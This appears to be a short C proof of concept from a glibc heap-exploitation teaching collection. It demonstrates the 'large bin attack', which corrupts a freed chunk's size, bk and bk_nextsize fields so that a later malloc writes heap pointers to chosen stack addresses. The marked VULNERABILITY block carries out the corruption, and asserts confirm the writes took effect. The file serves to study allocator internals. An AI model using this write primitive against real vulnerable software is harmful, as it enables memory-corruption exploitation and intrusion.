/*
    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    [...]
              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;
    [...]
    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.
    [...]
 */
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
int main()
{
       unsigned long stack_var1 = 0;
       unsigned long stack_var2 = 0;
       unsigned long *p1 = malloc(0x420);
       malloc(0x20);
       unsigned long *p2 = malloc(0x500);
       malloc(0x20);
       unsigned long *p3 = malloc(0x500);
       malloc(0x20);
       free(p1);
       free(p2);
       malloc(0x90);
       free(p3);
       //------------VULNERABILITY-----------
       p2[-1] = 0x3f1;
       p2[0] = 0;
       p2[2] = 0;
       p2[1] = (unsigned long)(&stack_var1 - 2);
       p2[3] = (unsigned long)(&stack_var2 - 4);
       //------------------------------------
       malloc(0x90);
       // sanity check
       assert(stack_var1 != 0);
       assert(stack_var2 != 0);
       return 0;
}
